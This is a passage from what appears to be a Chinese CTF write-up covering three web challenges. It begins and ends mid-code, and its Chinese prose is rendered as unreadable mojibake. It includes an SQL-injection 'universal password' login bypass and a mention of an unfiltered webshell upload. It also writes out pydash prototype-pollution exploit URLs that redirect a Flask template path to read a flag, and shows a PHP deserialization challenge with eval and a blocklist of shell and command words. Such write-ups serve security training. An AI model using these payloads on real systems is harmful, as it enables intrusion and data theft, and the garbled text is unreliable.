å¦‚æœå·²ç»ç™»å½•ï¼Œç›´æ¥è·³è½¬åˆ° upload.php</span></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_SESSION</span>[<span class="string">&#x27;loggedin&#x27;</span>]) &amp;&amp; <span class="variable">$_SESSION</span>[<span class="string">&#x27;loggedin&#x27;</span>] === <span class="literal">true</span>) &#123;</span><br><span class="line">    <span class="title function_ invoke__">header</span>(<span class="string">&quot;Location: upload.php&quot;</span>);</span><br><span class="line">    <span class="keyword">exit</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$_SERVER</span>[<span class="string">&#x27;REQUEST_METHOD&#x27;</span>] === <span class="string">&#x27;POST&#x27;</span>) &#123;</span><br><span class="line">    <span class="variable">$username</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;username&#x27;</span>] ?? <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">    <span class="variable">$password</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;password&#x27;</span>] ?? <span class="string">&#x27;&#x27;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$username</span> === <span class="string">&#x27;admin&#x27;</span> &amp;&amp; <span class="title function_ invoke__">strpos</span>(<span class="variable">$password</span>, <span class="string">&quot;&#x27; OR &#x27;1&#x27;=&#x27;1&quot;</span>) !== <span class="literal">false</span>) &#123;</span><br><span class="line">        <span class="variable">$_SESSION</span>[<span class="string">&#x27;loggedin&#x27;</span>] = <span class="literal">true</span>;</span><br><span class="line">        <span class="title function_ invoke__">header</span>(<span class="string">&quot;Location: /upload.php&quot;</span>);</span><br><span class="line">        <span class="keyword">exit</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="variable">$error</span> = <span class="string">&quot;âŒ ç”¨æˆ·åæˆ–å¯†ç é”™è¯¯&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>è‡ªå·±çœ‹å§ï¼Œæˆ‘ä¹Ÿä¸å¥½è¯´ä»€ä¹ˆäº†ï¼Œä¸€ä¸ªç™»å½•æ¡†æ²¡æœ‰å¸¦å…¥æ•°æ®åº“ï¼Œä¸ªäººæ„Ÿè§‰ä¸æ˜¯å¾ˆå¥½è¿™é‡Œï¼Œä¼°è®¡æ˜¯æƒ³è€ƒä¸‡èƒ½å¯†ç </p><p><code>SELECT * FROM users WHERE username = &#39;admin&#39; AND password = &#39;[ç”¨æˆ·è¾“å…¥çš„å¯†ç ]&#39;</code></p><p>ç„¶åæ‹¼æ¥ä¸Šå»ï¼Œä½†æ˜¯å®ƒè¿™è€ƒçš„ä¸å¤ªè¡Œï¼Œä¸‡èƒ½å¯†ç åˆä¸æ˜¯åªèƒ½é‚£æ ·ç”¨ï¼Œå¦‚æœsqlè¯­å¥é•¿è¿™æ ·æˆ‘è‚¯å®šå¯ä»¥åœ¨ç”¨æˆ·é‚£é‡Œå°±èƒ½ç”¨å•Šï¼ç™»å½•ä¸Šå»å°±æ˜¯æ— ä»»ä½•è¿‡æ»¤çš„webshellä¸Šä¼ ï¼Œä¹‹åæ‹¿flagå°±è¡Œï¼</p><h2 id="Who-am-I"><a href="#Who-am-I" class="headerlink" title="Who am I"></a>Who am I</h2><p>æŠ“åŒ…å…·ä½“é‚£ä¸ªåŒ…è‡ªå·±å»è¯•ä¸€è¯•ï¼Œåæ­£è¿™æ˜¯ä¿¡æ¯æ”¶é›†çš„ä¸€éƒ¨åˆ†ï¼Œæˆ‘ä¹Ÿæ‡’çš„å†å»åšä¸€éäº†ï¼Œç„¶åæ”¹äº†ä¸ªå‚æ•°type&#x3D;0ï¼Œè¶Šæƒåˆ°ç®¡ç†å‘˜ï¼Œæ‹¿åˆ°æºç </p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask,request,render_template,redirect,url_for</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"><span class="keyword">import</span> pydash</span><br><span class="line"></span><br><span class="line">app=Flask(__name__)</span><br><span class="line"></span><br><span class="line">database=&#123;&#125;</span><br><span class="line">data_index=<span class="number">0</span></span><br><span class="line">name=<span class="string">&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span>,methods=[<span class="string">&#x27;GET&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&#x27;login.html&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/register&#x27;</span>,methods=[<span class="string">&#x27;GET&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">register</span>():</span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&#x27;register.html&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/registerV2&#x27;</span>,methods=[<span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">registerV2</span>():</span><br><span class="line">    username=request.form[<span class="string">&#x27;username&#x27;</span>]</span><br><span class="line">    password=request.form[<span class="string">&#x27;password&#x27;</span>]</span><br><span class="line">    password2=request.form[<span class="string">&#x27;password2&#x27;</span>]</span><br><span class="line">    <span class="keyword">if</span> password!=password2:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">        &lt;script&gt;</span></span><br><span class="line"><span class="string">        alert(&#x27;å‰åå¯†ç ä¸ä¸€è‡´ï¼Œè¯·ç¡®è®¤åé‡æ–°è¾“å…¥ã€‚&#x27;);</span></span><br><span class="line"><span class="string">        window.location.href=&#x27;/register&#x27;;</span></span><br><span class="line"><span class="string">        &lt;/script&gt;</span></span><br><span class="line"><span class="string">        &#x27;&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">global</span> data_index</span><br><span class="line">        data_index+=<span class="number">1</span></span><br><span class="line">        database[data_index]=username</span><br><span class="line">        database[username]=password</span><br><span class="line">        <span class="keyword">return</span> redirect(url_for(<span class="string">&#x27;index&#x27;</span>))</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/user_dashboard&#x27;</span>,methods=[<span class="string">&#x27;GET&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">user_dashboard</span>():</span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&#x27;dashboard.html&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/272e1739b89da32e983970ece1a086bd&#x27;</span>,methods=[<span class="string">&#x27;GET&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">A272e1739b89da32e983970ece1a086bd</span>():</span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&#x27;admin.html&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/operate&#x27;</span>,methods=[<span class="string">&#x27;GET&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">operate</span>():</span><br><span class="line">    username=request.args.get(<span class="string">&#x27;username&#x27;</span>)</span><br><span class="line">    password=request.args.get(<span class="string">&#x27;password&#x27;</span>)</span><br><span class="line">    confirm_password=request.args.get(<span class="string">&#x27;confirm_password&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> username <span class="keyword">in</span> <span class="built_in">globals</span>() <span class="keyword">and</span> <span class="string">&quot;old&quot;</span> <span class="keyword">not</span> <span class="keyword">in</span> password:</span><br><span class="line">        Username=<span class="built_in">globals</span>()[username]</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            pydash.set_(Username,password,confirm_password)</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;oprate success&quot;</span></span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;oprate failed&quot;</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;oprate failed&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/user/name&#x27;</span>,methods=[<span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">name</span>():</span><br><span class="line">    <span class="keyword">return</span> &#123;<span class="string">&#x27;username&#x27;</span>:user&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">logout</span>():</span><br><span class="line">    <span class="keyword">return</span> redirect(url_for(<span class="string">&#x27;index&#x27;</span>))</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/reset&#x27;</span>,methods=[<span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">reset</span>():</span><br><span class="line">    old_password=request.form[<span class="string">&#x27;old_password&#x27;</span>]</span><br><span class="line">    new_password=request.form[<span class="string">&#x27;new_password&#x27;</span>]</span><br><span class="line">    <span class="keyword">if</span> user <span class="keyword">in</span> database <span class="keyword">and</span> database[user] == old_password:</span><br><span class="line">        database[user]=new_password</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">        &lt;script&gt;</span></span><br><span class="line"><span class="string">        alert(&#x27;å¯†ç ä¿®æ”¹æˆåŠŸï¼Œè¯·é‡æ–°ç™»å½•ã€‚&#x27;);</span></span><br><span class="line"><span class="string">        window.location.href=&#x27;/&#x27;;</span></span><br><span class="line"><span class="string">        &lt;/script&gt;</span></span><br><span class="line"><span class="string">        &#x27;&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">        &lt;script&gt;</span></span><br><span class="line"><span class="string">        alert(&#x27;å¯†ç ä¿®æ”¹å¤±è´¥ï¼Œè¯·ç¡®è®¤æ—§å¯†ç æ˜¯å¦æ­£ç¡®ã€‚&#x27;);</span></span><br><span class="line"><span class="string">        window.location.href=&#x27;/user_dashboard&#x27;;</span></span><br><span class="line"><span class="string">        &lt;/script&gt;</span></span><br><span class="line"><span class="string">        &#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/impression&#x27;</span>,methods=[<span class="string">&#x27;GET&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">impression</span>():</span><br><span class="line">    point=request.args.get(<span class="string">&#x27;point&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(point) &gt; <span class="number">5</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Invalid request&quot;</span></span><br><span class="line">    <span class="type">List</span>=[<span class="string">&quot;&#123;&quot;</span>,<span class="string">&quot;&#125;&quot;</span>,<span class="string">&quot;.&quot;</span>,<span class="string">&quot;%&quot;</span>,<span class="string">&quot;&lt;&quot;</span>,<span class="string">&quot;&gt;&quot;</span>,<span class="string">&quot;_&quot;</span>]</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> point:</span><br><span class="line">        <span class="keyword">if</span> i <span class="keyword">in</span> <span class="type">List</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;Invalid request&quot;</span></span><br><span class="line">    <span class="keyword">return</span> render_template(point)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/login&#x27;</span>,methods=[<span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">login</span>():</span><br><span class="line">    username=request.form[<span class="string">&#x27;username&#x27;</span>]</span><br><span class="line">    password=request.form[<span class="string">&#x27;password&#x27;</span>]</span><br><span class="line">    <span class="built_in">type</span>=request.form[<span class="string">&#x27;type&#x27;</span>]</span><br><span class="line">    <span class="keyword">if</span> username <span class="keyword">in</span> database <span class="keyword">and</span> database[username] != password:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">        &lt;script&gt;</span></span><br><span class="line"><span class="string">        alert(&#x27;ç”¨æˆ·åæˆ–å¯†ç é”™è¯¯è¯·é‡æ–°è¾“å…¥ã€‚&#x27;);</span></span><br><span class="line"><span class="string">        window.location.href=&#x27;/&#x27;;</span></span><br><span class="line"><span class="string">        &lt;/script&gt;</span></span><br><span class="line"><span class="string">        &#x27;&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">elif</span> username <span class="keyword">not</span> <span class="keyword">in</span> database:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">        &lt;script&gt;</span></span><br><span class="line"><span class="string">        alert(&#x27;ç”¨æˆ·åæˆ–å¯†ç é”™è¯¯è¯·é‡æ–°è¾“å…¥ã€‚&#x27;);</span></span><br><span class="line"><span class="string">        window.location.href=&#x27;/&#x27;;</span></span><br><span class="line"><span class="string">        &lt;/script&gt;</span></span><br><span class="line"><span class="string">        &#x27;&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">global</span> name</span><br><span class="line">        name=username</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">int</span>(<span class="built_in">type</span>)==<span class="number">1</span>:</span><br><span class="line">            <span class="keyword">return</span> redirect(url_for(<span class="string">&#x27;user_dashboard&#x27;</span>))</span><br><span class="line">        <span class="keyword">elif</span> <span class="built_in">int</span>(<span class="built_in">type</span>)==<span class="number">0</span>:</span><br><span class="line">            <span class="keyword">return</span> redirect(url_for(<span class="string">&#x27;A272e1739b89da32e983970ece1a086bd&#x27;</span>))</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__==<span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.run(host=<span class="string">&#x27;0.0.0.0&#x27;</span>,port=<span class="number">8080</span>,debug=<span class="literal">False</span>)</span><br></pre></td></tr></table></figure><p>å…³é”®éƒ¨åˆ†</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/operate&#x27;</span>,methods=[<span class="string">&#x27;GET&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">operate</span>():</span><br><span class="line">    username=request.args.get(<span class="string">&#x27;username&#x27;</span>)</span><br><span class="line">    password=request.args.get(<span class="string">&#x27;password&#x27;</span>)</span><br><span class="line">    confirm_password=request.args.get(<span class="string">&#x27;confirm_password&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> username <span class="keyword">in</span> <span class="built_in">globals</span>() <span class="keyword">and</span> <span class="string">&quot;old&quot;</span> <span class="keyword">not</span> <span class="keyword">in</span> password:</span><br><span class="line">        Username=<span class="built_in">globals</span>()[username]</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            pydash.set_(Username,password,confirm_password)</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;oprate success&quot;</span></span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;oprate failed&quot;</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;oprate failed&quot;</span></span><br><span class="line">    </span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/impression&#x27;</span>,methods=[<span class="string">&#x27;GET&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">impression</span>():</span><br><span class="line">    point=request.args.get(<span class="string">&#x27;point&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(point) &gt; <span class="number">5</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Invalid request&quot;</span></span><br><span class="line">    <span class="type">List</span>=[<span class="string">&quot;&#123;&quot;</span>,<span class="string">&quot;&#125;&quot;</span>,<span class="string">&quot;.&quot;</span>,<span class="string">&quot;%&quot;</span>,<span class="string">&quot;&lt;&quot;</span>,<span class="string">&quot;&gt;&quot;</span>,<span class="string">&quot;_&quot;</span>]</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> point:</span><br><span class="line">        <span class="keyword">if</span> i <span class="keyword">in</span> <span class="type">List</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;Invalid request&quot;</span></span><br><span class="line">    <span class="keyword">return</span> render_template(point)</span><br></pre></td></tr></table></figure><p>è¿™é‡Œè‚¯å®šæ˜¯æ— æ³•ç›´æ¥sstiçš„ï¼Œäºæ˜¯è½¬å‘&#x2F;oprateï¼Œè¿™é‡Œå°±æ˜¯<code>pydash.set_</code>çš„ä¸€ä¸ªåŸå‹é“¾æ±¡æŸ“</p><p><a href="https://rycarl.cn/index.php/2025/05/08/pydash%E4%B8%AD%E7%9A%84%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/">Pydashä¸­çš„åŸå‹é“¾æ±¡æŸ“ - Rycarls little blog</a></p><p>ä½†æ˜¯<code>username in globals()</code>å¤´å­å¿…é¡»æ˜¯åœ¨è¿™ä¸ªé‡Œé¢ï¼Œ<code>globals()</code> æ˜¯ Python å†…ç½®çš„ä¸€ä¸ªå‡½æ•°ï¼Œå®ƒè¿”å›ä¸€ä¸ªè¡¨ç¤ºå½“å‰å…¨å±€ç¬¦å·è¡¨çš„å­—å…¸ï¼è¿™é‡Œå¯ä»¥æ˜¯appï¼Œä¸€å¼€æ˜¯æƒ³å»æ±¡æŸ“é™æ€ç›®å½•ï¼Œä½†æ˜¯<code>old</code>ä¸èƒ½ç”¨ï¼Œç„¶åæˆ‘ä»¬è¿™é‡Œå¯ä»¥å»æ±¡æŸ“é»˜è®¤æ¸²æŸ“è·¯å¾„</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">/operate?username=app&amp;password=jinja_loader.searchpath&amp;confirm_password=/</span><br><span class="line">/impression?point=flag</span><br></pre></td></tr></table></figure><p>å°±ç›´æ¥å»&#x2F;ä¸‹å»æ¸²æŸ“flagæ–‡ä»¶ï¼Œæ‹¿åˆ°flag</p><h2 id="Bypass"><a href="#Bypass" class="headerlink" title="Bypass"></a>Bypass</h2><p>ç»™å‡ºæºç </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">FLAG</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$a</span>;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$b</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$a</span>, <span class="variable">$b</span></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;a = <span class="variable">$a</span>;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;b = <span class="variable">$b</span>;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">check</span>(<span class="variable">$a</span>,<span class="variable">$b</span>);</span><br><span class="line">            <span class="keyword">eval</span>(<span class="variable">$a</span>.<span class="variable">$b</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">            <span class="variable">$a</span> = (<span class="keyword">string</span>)<span class="variable language_">$this</span>-&gt;a;</span><br><span class="line">            <span class="variable">$b</span> = (<span class="keyword">string</span>)<span class="variable language_">$this</span>-&gt;b;</span><br><span class="line">            <span class="keyword">if</span> (<span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">check</span>(<span class="variable">$a</span>,<span class="variable">$b</span>))&#123;</span><br><span class="line">                <span class="variable">$a</span>(<span class="string">&quot;&quot;</span>, <span class="variable">$b</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">&quot;Try again!&quot;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">check</span>(<span class="params"><span class="variable">$a</span>, <span class="variable">$b</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$blocked_a</span> = [<span class="string">&#x27;eval&#x27;</span>, <span class="string">&#x27;dl&#x27;</span>, <span class="string">&#x27;ls&#x27;</span>, <span class="string">&#x27;p&#x27;</span>, <span class="string">&#x27;escape&#x27;</span>, <span class="string">&#x27;er&#x27;</span>, <span class="string">&#x27;str&#x27;</span>, <span class="string">&#x27;cat&#x27;</span>, <span class="string">&#x27;flag&#x27;</span>, <span class="string">&#x27;file&#x27;</span>, <span class="string">&#x27;ay&#x27;</span>, <span class="string">&#x27;or&#x27;</span>, <span class="string">&#x27;ftp&#x27;</span>, <span class="string">&#x27;dict&#x27;</span>, <span class="string">&#x27;\.\.&#x27;</span>, <span class="string">&#x27;h&#x27;</span>, <span class="string">&#x27;w&#x27;</span>, <span class="string">&#x27;exec&#x27;</span>, <span class="string">&#x27;s&#x27;</span>, <span class="string">&#x27;open&#x27;</span>];</span><br><span class="line">        <span class="variable">$blocked_b</span> = [<span class="string">&#x27;find&#x27;</span>, <span class="string">&#x27;filter&#x27;</span>, <span class="string">&#x27;c&#x27;</span>, <span class="string">&#x27;pa&#x27;</span>, <span class="string">&#x27;proc&#x27;</span>, <span class="string">&#x27;dir&#x27;</span>, <span class="string">&#x27;regexp&#x27;</span>, <span class="string">&#x27;n&#x27;</span>, <span class="string">&#x27;alter&#x27;</span>, <span class="string">&#x27;load&#x27;</span>, <span class="string">&#x27;grep&#x27;</span>, <span class="string">&#x27;o&#x27;</span>, <span class="string">&#x27;file&#x27;</span>, <span class="string">&#x27;t&#x27;</span>, <span class="string">&#x27;w&#x27;</span>, <span class="string">&#x27;insert&#x27;</span>, <span class="string">&#x27;sort&#x27;</span>, <span class="string">&#x27;h&#x27;</span>, <span class="string">&#x27;sy&#x27;</span>, <span class="string">&#x27;\.\.&#x27;</span>, <span class="string">&#x27;array&#x27;</span>, <span class="string">&#x27;sh&#x27;</span>, <span class="string">&#x27;touch&#x27;</span>, <span class="string">&#x27;e&#x27;</span>, <span class="string">&#x27;php&#x27;</span>, <span class="string">&#x27;f&#x27;</span>];</span><br><span class="line"></span><br><span class="line">        <span class="variable">$pattern_a</span> = <span class="string">&#x27;/&#x27;</span> . <span class="title function_ invoke__">implode</span>(<span class="string">&#x27;|&#x27;</span>, <span class="title function_ invoke__">array_map</span>(<span class="string">&#x27;preg_quote&#x27;</span>, <span class="variable">$blocked_a</span>, [<span class="string">&#x27;/&#x27;</span>])) . <span class="string">&#x27;/i&#x27;</span>;</span><br><span class="line">        <span class="variable">$pattern_b</span> = <span class="string">&#x27;/&#x27;</span> . <span class="title function_ invoke__">implode</span>(<span class="string">&#x27;|&#x27;</span>, <span class="title function_ invoke__">array_map</span>(<span class="string">&#x27;preg_quote&#x27;</span>, <span class="variable">$blocked_b</span>, [<span class="string">&#x27;/&#x27;</span>])) . <span class="string">&#x27;/i&#x27;</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">preg_match</span>(<span class="variable">$pattern_a</span>, <span class="variable">$a</span>) || <span class="title function_ invoke__">preg_match</span>(<span class="variable">$pattern_b</span>, <span class="variable">$b</span>)) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;exp&#x27;</span>])) &#123;</span><br><span class="line">    <span class="variable">$p</span> = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;exp&#x27;</span>]);</span><br><span class="line">    <span class="title function_ invoke__">var_dump</span>(<span class="variable">$p</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="string">&quot;index.php&quot;</span>);</span><br><span 